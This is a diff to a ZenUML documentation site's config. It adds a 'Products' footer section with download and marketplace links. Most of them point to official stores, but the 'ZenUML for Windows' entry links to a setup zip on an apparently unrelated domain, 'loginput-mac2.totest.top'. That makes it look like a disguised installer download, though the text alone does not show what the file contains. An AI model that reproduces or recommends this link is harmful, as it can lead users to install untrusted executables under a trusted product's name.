@@ -91,15 +91,35 @@ const config: Config = {
           ],
         },
         {
-          title: "Apps",
+          title: "Products",
           items: [
             {
-              label: "Web App",
-              to: "/docs/intro",
+              label: "Diagrams for Confluence",
+              href: "https://marketplace.atlassian.com/apps/1218380/zenuml-diagrams-for-confluence-freemium?hosting=cloud&tab=overview&src=landing",
             },
             {
-              label: "Confluence App",
-              to: "/docs/intro",
+              label: "Online Editor",
+              href: "https://app.zenuml.com/",
+            },
+            {
+              label: "Chrome Extendsion",
+              href: "https://chrome.google.com/webstore/detail/web-sequence/kcpganeflmhffnlofpdmcjklmdpbbmef",
+            },
+            {
+              label: "JetBrains Plugin",
+              href: "https://plugins.jetbrains.com/plugin/12437-zenuml-support",
+            },
+            {
+              label: "Visual Studio Code Plugin",
+              href: "https://marketplace.visualstudio.com/items?itemName=mrcoder.zenuml",
+            },
+            {
+              label: "ZenUML for Mac",
+              href: "https://apps.apple.com/app/zenuml/id1602636196?mt=12",
+            },
+            {
+              label: "ZenUML for Windows",
+              href: "https://loginput-mac2.totest.top/ZenUML-Setup.zip",
             },
           ],
         },
